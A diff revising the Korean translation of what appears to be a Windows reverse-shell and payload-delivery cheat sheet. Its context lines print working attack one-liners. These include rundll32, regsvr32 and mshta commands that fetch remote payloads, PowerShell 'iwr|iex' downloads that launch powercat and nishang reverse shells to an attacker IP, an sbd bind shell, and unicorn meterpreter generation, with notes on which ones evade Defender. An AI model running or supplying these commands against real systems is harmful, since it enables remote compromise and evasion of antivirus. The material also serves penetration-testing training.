@@ -27,7 +27,7 @@ ncat -l <PORT eg.443> --ssl
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/)는 휴대 가능하고 안전한 Netcat 대안입니다**. Unix 유사 시스템과 Win32에서 작동합니다. 강력한 암호화, 프로그램 실행, 사용자 정의 가능한 소스 포트 및 지속적인 재연결과 같은 기능을 갖춘 sbd는 TCP/IP 통신을 위한 다재다능한 솔루션을 제공합니다. Windows 사용자에게는 Kali Linux 배포판의 sbd.exe 버전을 Netcat의 신뢰할 수 있는 대체로 사용할 수 있습니다.
+**[sbd](https://www.kali.org/tools/sbd/)는 휴대 가능하고 안전한 Netcat 대안입니다**. Unix 유사 시스템과 Win32에서 작동합니다. 강력한 암호화, 프로그램 실행, 사용자 정의 가능한 소스 포트 및 지속적인 재연결과 같은 기능을 갖춘 sbd는 TCP/IP 통신을 위한 다재다능한 솔루션을 제공합니다. Windows 사용자에게는 Kali Linux 배포판의 sbd.exe 버전을 Netcat의 신뢰할 수 있는 대체품으로 사용할 수 있습니다.
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -165,7 +165,7 @@ Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given
 
 ## **Rundll32**
 
-[**Dll 헬로 월드 예제**](https://github.com/carterjones/hello-world-dll)
+[**Dll hello world 예제**](https://github.com/carterjones/hello-world-dll)
 
 - [여기에서](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```bash
@@ -175,7 +175,7 @@ rundll32 \\webdavserver\folder\payload.dll,entrypoint
 ```bash
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
 ```
-**탐지됨 - 방어자에 의해**
+**탐지됨 - defender**
 
 **Rundll32 - sct**
 
@@ -219,12 +219,12 @@ regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 ```
 regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 ```
-**탐지됨**
+**탐지됨 by defender**
 
 #### Regsvr32 -sct
 
 [**여기에서**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
-```markup
+```html
 <?XML version="1.0"?>
 <!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
 <!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
@@ -249,7 +249,7 @@ set lhost 10.2.0.5
 run
 #You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
 ```
-**stager regsvr를 사용하여 Koadic 좀비를 매우 쉽게 다운로드하고 실행할 수 있습니다.**
+**Koadic 좀비를 stager regsvr를 사용하여 매우 쉽게 다운로드하고 실행할 수 있습니다.**
 
 ## Certutil
 
@@ -375,7 +375,7 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-**Shells** 폴더에는 다양한 쉘이 많이 있다. Invoke-_PowerShellTcp.ps1_를 다운로드하고 실행하려면 스크립트의 복사본을 만들고 파일의 끝에 추가하십시오:
+**Shells** 폴더에는 다양한 쉘이 많이 있다. Invoke-_PowerShellTcp.ps1_를 다운로드하고 실행하려면 스크립트의 복사본을 만들고 파일 끝에 추가하십시오:
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
@@ -383,7 +383,7 @@ Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
-Defender는 이를 악성 코드로 감지하지 않습니다 (아직, 2019년 3월 4일).
+Defender는 이를 악성 코드로 탐지하지 않습니다 (아직, 2019년 3월 4일).
 
 **TODO: 다른 nishang 셸 확인하기**
 
@@ -391,7 +391,7 @@ Defender는 이를 악성 코드로 감지하지 않습니다 (아직, 2019년 3
 
 [**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)
 
-다운로드하고, 웹 서버를 시작하고, 리스너를 시작한 다음, 피해자의 끝에서 실행합니다:
+다운로드하고, 웹 서버를 시작하고, 리스너를 시작한 후, 피해자의 끝에서 실행합니다:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
@@ -399,7 +399,7 @@ Defender는 이를 악성 코드로 탐지하지 않습니다 (아직, 2019년 3
 
 **powercat이 제공하는 다른 옵션:**
 
-바인드 셸, 리버스 셸 (TCP, UDP, DNS), 포트 리디렉션, 업로드/다운로드, 페이로드 생성, 파일 제공...
+Bind shells, Reverse shell (TCP, UDP, DNS), Port redirect, upload/download, Generate payloads, Serve files...
 ```
 Serve a cmd Shell:
 powercat -l -p 443 -e cmd
@@ -430,7 +430,7 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 
 
 [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
-unicorn을 사용하여 metasploit 백도어의 powershell 버전을 생성합니다.
+유니콘을 사용하여 메타스플로잇 백도어의 파워셸 버전을 생성합니다.
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
@@ -444,13 +444,13 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
 **악성 코드로 감지됨**
 
-## 더 많은 정보
+## 더 알아보기
 
-[PS>Attack](https://github.com/jaredhaight/PSAttack) 일부 공격적인 PS 모듈이 미리 로드된 PS 콘솔 (암호화됨)\
-[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9)[\
-WinPWN](https://github.com/SecureThisShit/WinPwn) 일부 공격적인 PS 모듈과 프록시 탐지가 포함된 PS 콘솔 (IEX)
+[PS>Attack](https://github.com/jaredhaight/PSAttack) PS 콘솔에 일부 공격적인 PS 모듈이 미리 로드됨 (암호화됨)\
+[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
+WinPWN](https://github.com/SecureThisShit/WinPwn) PS 콘솔에 일부 공격적인 PS 모듈과 프록시 탐지 기능이 포함됨 (IEX)
 
-## 참고 문헌
+## 참고자료
 
 - [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
 - [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
